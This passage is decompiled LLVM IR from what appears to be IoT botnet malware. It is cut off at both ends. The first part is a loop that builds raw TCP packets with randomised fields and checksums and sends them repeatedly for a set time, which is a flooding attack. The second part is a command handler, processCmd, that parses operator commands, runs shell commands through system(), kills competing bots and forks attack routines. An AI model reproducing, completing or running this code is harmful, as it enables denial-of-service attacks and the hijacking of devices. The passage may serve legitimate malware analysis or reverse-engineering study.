  br i1 %v2_209f4, label %dec_label_pc_209fc, label %dec_label_pc_20870

dec_label_pc_209fc:                               ; preds = %dec_label_pc_209dc, %dec_label_pc_20854, %dec_label_pc_2079c
  %v0_209fc = call i32 @rand_cmwc()
  %v1_20a10 = trunc i32 %v0_209fc to i16
  %v3_20a10 = add i32 %v3_206c8, 34
  %v4_20a10 = inttoptr i32 %v3_20a10 to i16*
  store i16 %v1_20a10, i16* %v4_20a10, align 2
  %v3_20a1c = add i32 %v3_206c8, 36
  %v4_20a1c = inttoptr i32 %v3_20a1c to i16*
  store i16 0, i16* %v4_20a1c, align 4
  store i32 %v1_206e8, i32* %r2.global-to-local, align 4
  %v3_20a28 = add i32 %v3_206c8, 38
  %v4_20a28 = inttoptr i32 %v3_20a28 to i16*
  store i16 0, i16* %v4_20a28, align 2
  br i1 %v2_20564, label %dec_label_pc_20a38, label %dec_label_pc_20a50

dec_label_pc_20a38:                               ; preds = %dec_label_pc_209fc
  %v0_20a38 = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_20a38 to i16
  br label %dec_label_pc_20a6c

dec_label_pc_20a50:                               ; preds = %dec_label_pc_209fc
  %v3_20a58 = urem i32 %arg2, 65536
  %v1_20a60 = call i32 @__GI_htons(i32 %v3_20a58)
  %extract.t72 = trunc i32 %v1_20a60 to i16
  br label %dec_label_pc_20a6c

dec_label_pc_20a6c:                               ; preds = %dec_label_pc_20a38, %dec_label_pc_20a50
  %v0_20a38.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_20a38 ], [ %extract.t72, %dec_label_pc_20a50 ]
  %v3_20a74 = add i32 %v3_206c8, 22
  %v4_20a74 = inttoptr i32 %v3_20a74 to i16*
  store i16 %v0_20a38.sink.off0, i16* %v4_20a74, align 2
  %v2_20a80 = call i32 @tcpcsum(i32 %v3_206c8, i32 %v1_206e8)
  %v1_20a90 = trunc i32 %v2_20a80 to i16
  store i16 %v1_20a90, i16* %v4_20a1c, align 4
  store i32 %v3_206c8, i32* %r2.global-to-local, align 4
  %v1_20aa0 = or i32 %v3_206c8, 2
  %v2_20aa0 = inttoptr i32 %v1_20aa0 to i16*
  %v3_20aa0 = load i16, i16* %v2_20aa0, align 2
  %v4_20aa0 = zext i16 %v3_20aa0 to i32
  %v2_20aac = inttoptr i32 %v3_206c8 to i16*
  %v3_20aac = call i32 @csum(i16* %v2_20aac, i32 %v4_20aa0)
  %sext3 = mul i32 %v3_20aac, 65536
  %v1_20ab0 = sdiv i32 %sext3, 65536
  store i32 %v1_20ab0, i32* %r2.global-to-local, align 4
  %v1_20abc = trunc i32 %v1_20ab0 to i16
  %v3_20abc = add i32 %v3_206c8, 10
  %v4_20abc = inttoptr i32 %v3_20abc to i16*
  store i16 %v1_20abc, i16* %v4_20abc, align 2
  %v2_20ac4 = call i32 @__GI_time(i32* null)
  %v2_20ad0 = add i32 %v2_20ac4, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_20ae4 = ptrtoint i32* %stack_var_-68 to i32
  %v2_20b24 = add i32 %v3_206c8, 12
  %v3_20b24 = inttoptr i32 %v2_20b24 to i32*
  %v3_20b3c = or i32 %v3_206c8, 4
  %v4_20b3c = inttoptr i32 %v3_20b3c to i16*
  br label %dec_label_pc_20ae0

dec_label_pc_20ae0:                               ; preds = %dec_label_pc_20bf0, %dec_label_pc_20be4, %dec_label_pc_20a6c
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_20a6c ], [ 0, %dec_label_pc_20be4 ], [ %v1_20bf4, %dec_label_pc_20bf0 ]
  store i32 %v3_206c8, i32* %r2.global-to-local, align 4
  %v1_20ae8 = load i32, i32* @sp, align 4
  %v2_20ae8 = inttoptr i32 %v1_20ae8 to i32*
  store i32 %v2_20ae4, i32* %v2_20ae8, align 4
  %v1_20af0 = load i32, i32* @sp, align 4
  %v2_20af0 = add i32 %v1_20af0, 4
  %v3_20af0 = inttoptr i32 %v2_20af0 to i32*
  store i32 16, i32* %v3_20af0, align 4
  %v0_20af8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_20698, i32* %r2.global-to-local, align 4
  %v6_20b04 = call i32 @__libc_sendto(i32 %v3_205e8, i32 %v0_20af8, i32 %v1_20698, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_20b0c = call i32 @HackerScan2(i32 %storemerge9)
  %v1_20b18 = call i32 @__GI_htonl(i32 %v1_20b0c)
  store i32 %v1_20b18, i32* %r2.global-to-local, align 4
  store i32 %v1_20b18, i32* %v3_20b24, align 4
  %v0_20b28 = call i32 @rand_cmwc()
  %v3_20b34 = urem i32 %v0_20b28, 65536
  store i32 %v3_20b34, i32* %r2.global-to-local, align 4
  %v1_20b3c = trunc i32 %v0_20b28 to i16
  store i16 %v1_20b3c, i16* %v4_20b3c, align 4
  %v0_20b40 = call i32 @rand_cmwc()
  store i32 %v0_20b40, i32* %r2.global-to-local, align 4
  store i32 %v0_20b40, i32* %v3_2074c, align 8
  %v0_20b50 = call i32 @rand_cmwc()
  %v1_20b64 = trunc i32 %v0_20b50 to i16
  store i16 %v1_20b64, i16* %v5_206ec, align 4
  store i32 %v1_206e8, i32* %r2.global-to-local, align 4
  store i16 0, i16* %v4_20a1c, align 4
  %v4_20b7c = call i32 @tcpcsum(i32 %v3_206c8, i32 %v1_206e8)
  %v1_20b8c = trunc i32 %v4_20b7c to i16
  store i16 %v1_20b8c, i16* %v4_20a1c, align 4
  store i32 %v3_206c8, i32* %r2.global-to-local, align 4
  %v3_20b9c = load i16, i16* %v2_20aa0, align 2
  %v4_20b9c = zext i16 %v3_20b9c to i32
  %v3_20ba8 = call i32 @csum(i16* %v2_20aac, i32 %v4_20b9c)
  %sext5 = mul i32 %v3_20ba8, 65536
  %v1_20bac = sdiv i32 %sext5, 65536
  store i32 %v1_20bac, i32* %r2.global-to-local, align 4
  %v1_20bb8 = trunc i32 %v1_20bac to i16
  store i16 %v1_20bb8, i16* %v4_20abc, align 2
  %v9_20bc4 = icmp eq i32 %stack_var_-92.0, %arg7
  br i1 %v9_20bc4, label %dec_label_pc_20bcc, label %dec_label_pc_20bf0

dec_label_pc_20bcc:                               ; preds = %dec_label_pc_20ae0
  %v2_20bd0 = call i32 @__GI_time(i32* null)
  store i32 %v2_20bd0, i32* %r2.global-to-local, align 4
  %v8_20be0 = icmp sgt i32 %v2_20bd0, %v2_20ad0
  br i1 %v8_20be0, label %dec_label_pc_20c00, label %dec_label_pc_20be4

dec_label_pc_20be4:                               ; preds = %dec_label_pc_20bcc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_20ae0

dec_label_pc_20bf0:                               ; preds = %dec_label_pc_20ae0
  %v1_20bf4 = add i32 %stack_var_-92.0, 1
  br label %dec_label_pc_20ae0

dec_label_pc_20c00:                               ; preds = %dec_label_pc_20bcc, %dec_label_pc_205a0, %dec_label_pc_2064c, %dec_label_pc_20600
  %v1_20c0c = phi i32 [ %v3_205b0, %dec_label_pc_205a0 ], [ %v3_2065c, %dec_label_pc_2064c ], [ %v3_20610, %dec_label_pc_20600 ], [ %v2_20bd0, %dec_label_pc_20bcc ]
  ret i32 %v1_20c0c

; uselistorder directives
  uselistorder i32 %v1_20bac, { 1, 0 }
  uselistorder i32 %v0_20b28, { 1, 0 }
  uselistorder i32 %v1_20ab0, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i8* %v2_20890, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i8* %v2_207a0, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i32 %v0_20728, { 1, 0 }
  uselistorder i32 %v1_206e8, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10 }
  uselistorder i32 %v3_206c8, { 9, 8, 6, 19, 7, 5, 21, 18, 4, 3, 17, 16, 15, 14, 13, 20, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_20698, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @__GI_htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @HackerScan2, { 3, 2, 1, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_20c00, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_20a6c, { 1, 0 }
  uselistorder label %dec_label_pc_209dc, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_20870, { 1, 0 }
  uselistorder label %dec_label_pc_20694, { 1, 0 }
  uselistorder label %dec_label_pc_205a0, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_20c40 = load i32, i32* @r4, align 4
  %v6_20c40 = load i32, i32* @r5, align 4
  %v9_20c40 = load i32, i32* @r6, align 4
  %v12_20c40 = load i32, i32* @r7, align 4
  %v15_20c40 = load i32, i32* @r8, align 4
  %v18_20c40 = load i32, i32* @fp, align 4
  store i32 134216, i32* %stack_var_-4, align 4
  %v2_20c44 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_20c44, i32* @fp, align 4
  %v2_20c58 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_325f0.63 to i32), i32* @r1, align 4
  %v3_20c64 = inttoptr i32 %v2_20c58 to i8*
  %v4_20c64 = call i32 @__GI_strcoll(i8* %v3_20c64, i32 ptrtoint ([5 x i8]* @global_var_325f0.63 to i32))
  %v2_20c6c = icmp eq i32 %v4_20c64, 0
  br i1 %v2_20c6c, label %dec_label_pc_20c74, label %dec_label_pc_20c8c

dec_label_pc_20c74:                               ; preds = %entry
  %v2_20c78 = load i32, i32* @global_var_42c60.61, align 4
  %v3_20c84 = call i32 @HackerPrint(i32 %v2_20c78, i32 ptrtoint ([6 x i8]* @global_var_38cf8.2912 to i32))
  br label %dec_label_pc_21a30

dec_label_pc_20c8c:                               ; preds = %entry
  %v2_20c90 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_38d00.2914 to i32), i32* @r1, align 4
  %v3_20c9c = inttoptr i32 %v2_20c90 to i8*
  %v4_20c9c = call i32 @__GI_strcoll(i8* %v3_20c9c, i32 ptrtoint ([11 x i8]* @global_var_38d00.2914 to i32))
  %v2_20ca4 = icmp eq i32 %v4_20c9c, 0
  br i1 %v2_20ca4, label %dec_label_pc_20cac, label %dec_label_pc_20cd8

dec_label_pc_20cac:                               ; preds = %dec_label_pc_20c8c
  %v2_20cb0 = load i32, i32* @global_var_42c60.61, align 4
  store i32 %v2_20cb0, i32* @r4, align 4
  %v2_20cb8 = load i32, i32* @global_var_49980.2631, align 4
  store i32 %v2_20cb8, i32* @r0, align 4
  %v1_20cbc = call i32 @__GI_inet_ntoa(i32 %v2_20cb8)
  %v0_20cc4 = load i32, i32* @r4, align 4
  store i32 %v1_20cbc, i32* @r2, align 4
  %v3_20cd0 = call i32 @HackerPrint(i32 %v0_20cc4, i32 ptrtoint ([10 x i8]* @global_var_38d0c.2917 to i32))
  br label %dec_label_pc_21a30

dec_label_pc_20cd8:                               ; preds = %dec_label_pc_20c8c
  %v2_20cdc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_38d18.2919 to i32), i32* @r1, align 4
  %v3_20ce8 = inttoptr i32 %v2_20cdc to i8*
  %v4_20ce8 = call i32 @__GI_strcoll(i8* %v3_20ce8, i32 ptrtoint ([7 x i8]* @global_var_38d18.2919 to i32))
  %v2_20cf0 = icmp eq i32 %v4_20ce8, 0
  br i1 %v2_20cf0, label %dec_label_pc_20cf8, label %dec_label_pc_20e50

dec_label_pc_20cf8:                               ; preds = %dec_label_pc_20cd8
  %v7_20cfc = icmp eq i32 %arg1, 2
  br i1 %v7_20cfc, label %dec_label_pc_20d1c, label %dec_label_pc_20d04

dec_label_pc_20d04:                               ; preds = %dec_label_pc_20cf8
  %v2_20d08 = load i32, i32* @global_var_42c60.61, align 4
  %v3_20d14 = call i32 @HackerPrint(i32 %v2_20d08, i32 ptrtoint ([23 x i8]* @global_var_38d20.2921 to i32))
  br label %dec_label_pc_21a30

dec_label_pc_20d1c:                               ; preds = %dec_label_pc_20cf8
  %v1_20d20 = add i32 %tmp, 4
  %v1_20d24 = inttoptr i32 %v1_20d20 to i32*
  %v2_20d24 = load i32, i32* %v1_20d24, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_38d38.2923 to i32), i32* @r1, align 4
  %v3_20d30 = inttoptr i32 %v2_20d24 to i8*
  %v4_20d30 = call i32 @__GI_strcoll(i8* %v3_20d30, i32 ptrtoint ([4 x i8]* @global_var_38d38.2923 to i32))
  %v2_20d38 = icmp eq i32 %v4_20d30, 0
  br i1 %v2_20d38, label %dec_label_pc_20d40, label %dec_label_pc_20d50

dec_label_pc_20d40:                               ; preds = %dec_label_pc_20d1c
  %v2_20d44 = call i32 @__libc_system(i32 ptrtoint ([16 x i8]* @global_var_38d3c.2925 to i32))
  %v2_20d4c = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_374d8.2757 to i32))
  br label %dec_label_pc_20d50

dec_label_pc_20d50:                               ; preds = %dec_label_pc_20d1c, %dec_label_pc_20d40
  %v2_20d58 = load i32, i32* %v1_20d24, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_38d4c.2928 to i32), i32* @r1, align 4
  %v3_20d64 = inttoptr i32 %v2_20d58 to i8*
  %v4_20d64 = call i32 @__GI_strcoll(i8* %v3_20d64, i32 ptrtoint ([9 x i8]* @global_var_38d4c.2928 to i32))
  %v2_20d6c = icmp eq i32 %v4_20d64, 0
  br i1 %v2_20d6c, label %dec_label_pc_20d74, label %dec_label_pc_20d90

dec_label_pc_20d74:                               ; preds = %dec_label_pc_20d50
  %v2_20d78 = call i32 @__libc_system(i32 ptrtoint ([122 x i8]* @global_var_38d58.2930 to i32))
  %v2_20d80 = load i32, i32* @global_var_42c60.61, align 4
  %v3_20d8c = call i32 @HackerPrint(i32 %v2_20d80, i32 ptrtoint ([20 x i8]* @global_var_38dd4.2932 to i32))
  br label %dec_label_pc_20d90

dec_label_pc_20d90:                               ; preds = %dec_label_pc_20d50, %dec_label_pc_20d74
  %v2_20d98 = load i32, i32* %v1_20d24, align 4
  store i32 ptrtoint (i32* @global_var_38de8.2934 to i32), i32* @r1, align 4
  %v2_20da4 = inttoptr i32 %v2_20d98 to i8*
  %v3_20da4 = call i32 @__GI_strcoll(i8* %v2_20da4, i32 ptrtoint (i32* @global_var_38de8.2934 to i32))
  %v2_20dac = icmp eq i32 %v3_20da4, 0
  br i1 %v2_20dac, label %dec_label_pc_20db4, label %dec_label_pc_20dd0

dec_label_pc_20db4:                               ; preds = %dec_label_pc_20d90
  %v2_20db8 = call i32 @__libc_system(i32 ptrtoint ([39 x i8]* @global_var_38dec.2936 to i32))
  %v2_20dc0 = load i32, i32* @global_var_42c60.61, align 4
  %v3_20dcc = call i32 @HackerPrint(i32 %v2_20dc0, i32 ptrtoint ([27 x i8]* @global_var_38e14.2938 to i32))
  br label %dec_label_pc_20dd0

dec_label_pc_20dd0:                               ; preds = %dec_label_pc_20d90, %dec_label_pc_20db4
  %v2_20dd8 = load i32, i32* %v1_20d24, align 4
  store i32 ptrtoint (i32* @global_var_38e30.2940 to i32), i32* @r1, align 4
  %v2_20de4 = inttoptr i32 %v2_20dd8 to i8*
  %v3_20de4 = call i32 @__GI_strcoll(i8* %v2_20de4, i32 ptrtoint (i32* @global_var_38e30.2940 to i32))
  %v2_20dec = icmp eq i32 %v3_20de4, 0
  br i1 %v2_20dec, label %dec_label_pc_20df4, label %dec_label_pc_20e10

dec_label_pc_20df4:                               ; preds = %dec_label_pc_20dd0
  %v2_20df8 = call i32 @__libc_system(i32 ptrtoint ([40 x i8]* @global_var_38e34.2942 to i32))
  %v2_20e00 = load i32, i32* @global_var_42c60.61, align 4
  %v3_20e0c = call i32 @HackerPrint(i32 %v2_20e00, i32 ptrtoint ([27 x i8]* @global_var_38e14.2938 to i32))
  br label %dec_label_pc_20e10

dec_label_pc_20e10:                               ; preds = %dec_label_pc_20dd0, %dec_label_pc_20df4
  %v2_20e18 = load i32, i32* %v1_20d24, align 4
  store i32 ptrtoint (i32* @global_var_38e5c.2944 to i32), i32* @r1, align 4
  %v2_20e24 = inttoptr i32 %v2_20e18 to i8*
  %v3_20e24 = call i32 @__GI_strcoll(i8* %v2_20e24, i32 ptrtoint (i32* @global_var_38e5c.2944 to i32))
  %v2_20e2c = icmp eq i32 %v3_20e24, 0
  br i1 %v2_20e2c, label %dec_label_pc_20e34, label %dec_label_pc_20e50

dec_label_pc_20e34:                               ; preds = %dec_label_pc_20e10
  %v2_20e38 = call i32 @__libc_system(i32 ptrtoint ([39 x i8]* @global_var_38e60.2946 to i32))
  %v2_20e40 = load i32, i32* @global_var_42c60.61, align 4
  %v3_20e4c = call i32 @HackerPrint(i32 %v2_20e40, i32 ptrtoint ([27 x i8]* @global_var_38e14.2938 to i32))
  br label %dec_label_pc_20e50

dec_label_pc_20e50:                               ; preds = %dec_label_pc_20e10, %dec_label_pc_20cd8, %dec_label_pc_20e34
  %v2_20e54 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_38e88.2948 to i32), i32* @r1, align 4
  %v3_20e60 = inttoptr i32 %v2_20e54 to i8*
  %v4_20e60 = call i32 @__GI_strcoll(i8* %v3_20e60, i32 ptrtoint ([8 x i8]* @global_var_38e88.2948 to i32))
  %v2_20e68 = icmp eq i32 %v4_20e60, 0
  br i1 %v2_20e68, label %dec_label_pc_20e70, label %dec_label_pc_20ea4

dec_label_pc_20e70:                               ; preds = %dec_label_pc_20e50
  %v0_20e70 = call i32 @listFork()
  %v2_20e78 = icmp eq i32 %v0_20e70, 0
  br i1 %v2_20e78, label %dec_label_pc_20e80, label %dec_label_pc_20ea4

dec_label_pc_20e80:                               ; preds = %dec_label_pc_20e70
  %v2_20e84 = load i32, i32* @global_var_42c60.61, align 4
  %v3_20e90 = call i32 @HackerPrint(i32 %v2_20e84, i32 ptrtoint ([13 x i8]* @global_var_38e90.2950 to i32))
  %v1_20e94 = call i32 @botkiller(i32 %v3_20e90)
  %v1_20e98 = call i32 @RemoveTMP(i32 %v1_20e94)
  %v1_20ea0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_20ea4

dec_label_pc_20ea4:                               ; preds = %dec_label_pc_20e70, %dec_label_pc_20e50, %dec_label_pc_20e80
  %v2_20ea8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_38ea0.2952 to i32), i32* @r1, align 4
  %v3_20eb4 = inttoptr i32 %v2_20ea8 to i8*
  %v4_20eb4 = call i32 @__GI_strcoll(i8* %v3_20eb4, i32 ptrtoint ([7 x i8]* @global_var_38ea0.2952 to i32))
  %v2_20ebc = icmp eq i32 %v4_20eb4, 0
  br i1 %v2_20ebc, label %dec_label_pc_20ec4, label %dec_label_pc_20ef4

dec_label_pc_20ec4:                               ; preds = %dec_label_pc_20ea4
  %v0_20ec4 = call i32 @listFork()
  %v2_20ecc = icmp eq i32 %v0_20ec4, 0
  br i1 %v2_20ecc, label %dec_label_pc_20ed4, label %dec_label_pc_20ef4

dec_label_pc_20ed4:                               ; preds = %dec_label_pc_20ec4
  %v2_20ed8 = load i32, i32* @global_var_42c60.61, align 4
  %v3_20ee4 = call i32 @HackerPrint(i32 %v2_20ed8, i32 ptrtoint ([16 x i8]* @global_var_38ea8.2954 to i32))
  %v1_20ee8 = call i32 @LoopPayload(i32 %v3_20ee4)
  %v1_20ef0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_20ef4

dec_label_pc_20ef4:                               ; preds = %dec_label_pc_20ec4, %dec_label_pc_20ea4, %dec_label_pc_20ed4
  %v2_20ef8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_38eb8.2956 to i32), i32* @r1, align 4
  %v3_20f04 = inttoptr i32 %v2_20ef8 to i8*
  %v4_20f04 = call i32 @__GI_strcoll(i8* %v3_20f04, i32 ptrtoint ([8 x i8]* @global_var_38eb8.2956 to i32))
  %v2_20f0c = icmp eq i32 %v4_20f04, 0
  br i1 %v2_20f0c, label %dec_label_pc_20f14, label %dec_label_pc_21014

dec_label_pc_20f14:                               ; preds = %dec_label_pc_20ef4
  %v7_20f18 = icmp eq i32 %arg1, 2
  br i1 %v7_20f18, label %dec_label_pc_20f38, label %dec_label_pc_20f20

dec_label_pc_20f20:                               ; preds = %dec_label_pc_20f14
  %v2_20f24 = load i32, i32* @global_var_42c60.61, align 4
  %v3_20f30 = call i32 @HackerPrint(i32 %v2_20f24, i32 ptrtoint ([17 x i8]* @global_var_38ec0.2958 to i32))
  br label %dec_label_pc_21a30

dec_label_pc_20f38:                               ; preds = %dec_label_pc_20f14
  %v1_20f3c = add i32 %tmp, 4
  %v1_20f40 = inttoptr i32 %v1_20f3c to i32*
  %v2_20f40 = load i32, i32* %v1_20f40, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_38ed4.2960 to i32), i32* @r1, align 4
  %v3_20f4c = inttoptr i32 %v2_20f40 to i8*
  %v4_20f4c = call i32 @__GI_strcoll(i8* %v3_20f4c, i32 ptrtoint ([4 x i8]* @global_var_38ed4.2960 to i32))
  %v2_20f54 = icmp eq i32 %v4_20f4c, 0
  br i1 %v2_20f54, label %dec_label_pc_20f5c, label %dec_label_pc_20fa0

dec_label_pc_20f5c:                               ; preds = %dec_label_pc_20f38
  %v2_20f60 = load i32, i32* @global_var_4998c.2962, align 4
  %v2_20f64 = icmp eq i32 %v2_20f60, 0
  br i1 %v2_20f64, label %dec_label_pc_21a30, label %dec_label_pc_20f6c

dec_label_pc_20f6c:                               ; preds = %dec_label_pc_20f5c
  %v2_20f7c = call i32 @kill(i32 %v2_20f60, i32 9)
  %v2_20f84 = load i32, i32* @global_var_42c60.61, align 4
  %v3_20f90 = call i32 @HackerPrint(i32 %v2_20f84, i32 ptrtoint ([5 x i8]* @global_var_38ed8.2964 to i32))
  store i32 0, i32* @global_var_4998c.2962, align 4
  br label %dec_label_pc_20fa0

dec_label_pc_20fa0:                               ; preds = %dec_label_pc_20f38, %dec_label_pc_20f6c
  %v2_20fa8 = load i32, i32* %v1_20f40, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_38ee0.2966 to i32), i32* @r1, align 4
  %v3_20fb4 = inttoptr i32 %v2_20fa8 to i8*
  %v4_20fb4 = call i32 @__GI_strcoll(i8* %v3_20fb4, i32 ptrtoint ([3 x i8]* @global_var_38ee0.2966 to i32))
  %v2_20fbc = icmp eq i32 %v4_20fb4, 0
  br i1 %v2_20fbc, label %dec_label_pc_20fc4, label %dec_label_pc_21014

dec_label_pc_20fc4:                               ; preds = %dec_label_pc_20fa0
  %v2_20fc8 = load i32, i32* @global_var_4998c.2962, align 4
  %v2_20fcc = icmp eq i32 %v2_20fc8, 0
  br i1 %v2_20fcc, label %dec_label_pc_20fd4, label %dec_label_pc_21a30

dec_label_pc_20fd4:                               ; preds = %dec_label_pc_20fc4
  %v0_20fd4 = call i32 @__libc_fork()
  %v2_20fe4 = icmp eq i32 %v0_20fd4, 0
  br i1 %v2_20fe4, label %dec_label_pc_21008, label %dec_label_pc_20fec

dec_label_pc_20fec:                               ; preds = %dec_label_pc_20fd4
  store i32 %v0_20fd4, i32* @global_var_4998c.2962, align 4
  br label %dec_label_pc_21a30

dec_label_pc_21008:                               ; preds = %dec_label_pc_20fd4
  %v0_21008 = call i32 @StartTheLelz()
  %v1_21010 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_21014

dec_label_pc_21014:                               ; preds = %dec_label_pc_20fa0, %dec_label_pc_20ef4, %dec_label_pc_21008
  %v2_21018 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_38ee4.2968 to i32), i32* @r1, align 4
  %v3_21024 = inttoptr i32 %v2_21018 to i8*
  %v4_21024 = call i32 @__GI_strcoll(i8* %v3_21024, i32 ptrtoint ([4 x i8]* @global_var_38ee4.2968 to i32))
  %v2_2102c = icmp eq i32 %v4_21024, 0
  br i1 %v2_2102c, label %dec_label_pc_21034, label %dec_label_pc_212c4

dec_label_pc_21034:                               ; preds = %dec_label_pc_21014
  %v7_2103c = icmp slt i32 %arg1, 6
  br i1 %v7_2103c, label %dec_label_pc_21a30, label %dec_label_pc_21040

dec_label_pc_21040:                               ; preds = %dec_label_pc_21034
  %v1_21044 = add i32 %tmp, 12
  %v1_21048 = inttoptr i32 %v1_21044 to i32*
  %v2_21048 = load i32, i32* %v1_21048, align 4
  store i32 %v2_21048, i32* @r0, align 4
  %v1_21050 = call i32 @atol(i32 %v2_21048)
  %v7_21058 = icmp eq i32 %v1_21050, -1
  br i1 %v7_21058, label %dec_label_pc_21a30, label %dec_label_pc_21060

dec_label_pc_21060:                               ; preds = %dec_label_pc_21040
  %v1_21064 = add i32 %tmp, 8
  %v1_21068 = inttoptr i32 %v1_21064 to i32*
  %v2_21068 = load i32, i32* %v1_21068, align 4
  store i32 %v2_21068, i32* @r0, align 4
  %v1_21070 = call i32 @atol(i32 %v2_21068)
  %v7_21078 = icmp eq i32 %v1_21070, -1
  br i1 %v7_21078, label %dec_label_pc_21a30, label %dec_label_pc_21080

dec_label_pc_21080:                               ; preds = %dec_label_pc_21060
  %v1_21084 = add i32 %tmp, 16
  %v1_21088 = inttoptr i32 %v1_21084 to i32*
  %v2_21088 = load i32, i32* %v1_21088, align 4
  store i32 %v2_21088, i32* @r0, align 4
  %v1_21090 = call i32 @atol(i32 %v2_21088)
  %v7_21098 = icmp eq i32 %v1_21090, -1
  br i1 %v7_21098, label %dec_label_pc_21a30, label %dec_label_pc_210a0

dec_label_pc_210a0:                               ; preds = %dec_label_pc_21080
  %v1_210a4 = add i32 %tmp, 20
  %v1_210a8 = inttoptr i32 %v1_210a4 to i32*
  %v2_210a8 = load i32, i32* %v1_210a8, align 4
  store i32 %v2_210a8, i32* @r0, align 4
  %v1_210b0 = call i32 @atol(i32 %v2_210a8)
  %v7_210b8 = icmp eq i32 %v1_210b0, -1
  br i1 %v7_210b8, label %dec_label_pc_21a30, label %dec_label_pc_210c0

dec_label_pc_210c0:                               ; preds = %dec_label_pc_210a0
  %v2_210c8 = load i32, i32* %v1_210a8, align 4
  store i32 %v2_210c8, i32* @r0, align 4
  %v1_210d0 = call i32 @atol(i32 %v2_210c8)
  %v8_210e4 = icmp sgt i32 %v1_210d0, 65500
  br i1 %v8_210e4, label %dec_label_pc_21a30, label %dec_label_pc_210e8

dec_label_pc_210e8:                               ; preds = %dec_label_pc_210c0
  %v2_210f0 = load i32, i32* %v1_21088, align 4
  store i32 %v2_210f0, i32* @r0, align 4
  %v1_210f8 = call i32 @atol(i32 %v2_210f0)
  %v8_21104 = icmp sgt i32 %v1_210f8, 32
  br i1 %v8_21104, label %dec_label_pc_21a30, label %dec_label_pc_21108

dec_label_pc_21108:                               ; preds = %dec_label_pc_210e8
  %v7_2110c = icmp eq i32 %arg1, 7
  br i1 %v7_2110c, label %dec_label_pc_21114, label %dec_label_pc_21138

dec_label_pc_21114:                               ; preds = %dec_label_pc_21108
  %v1_21118 = add i32 %tmp, 24
  %v1_2111c = inttoptr i32 %v1_21118 to i32*
  %v2_2111c = load i32, i32* %v1_2111c, align 4
  store i32 %v2_2111c, i32* @r0, align 4
  %v1_21124 = call i32 @atol(i32 %v2_2111c)
  %v5_21130 = icmp sgt i32 %v1_21124, 0
  br i1 %v5_21130, label %dec_label_pc_21138, label %dec_label_pc_21a30

dec_label_pc_21138:                               ; preds = %dec_label_pc_21108, %dec_label_pc_21114
  %v1_2113c = add i32 %tmp, 4
  %v1_21140 = inttoptr i32 %v1_2113c to i32*
  %v2_21140 = load i32, i32* %v1_21140, align 4
  %v2_21150 = load i32, i32* %v1_21068, align 4
  store i32 %v2_21150, i32* @r0, align 4
  %v1_21158 = call i32 @atol(i32 %v2_21150)
  %v2_2116c = load i32, i32* %v1_21048, align 4
  store i32 %v2_2116c, i32* @r0, align 4
  %v1_21174 = call i32 @atol(i32 %v2_2116c)
  %v2_21188 = load i32, i32* %v1_21088, align 4
  store i32 %v2_21188, i32* @r0, align 4
  %v1_21190 = call i32 @atol(i32 %v2_21188)
  %v2_211a4 = load i32, i32* %v1_210a8, align 4
  store i32 %v2_211a4, i32* @r0, align 4
  %v1_211ac = call i32 @atol(i32 %v2_211a4)
  br i1 %v7_2110c, label %dec_label_pc_211c4, label %dec_label_pc_211e0

dec_label_pc_211c4:                               ; preds = %dec_label_pc_21138
  %v1_211c8 = add i32 %tmp, 24
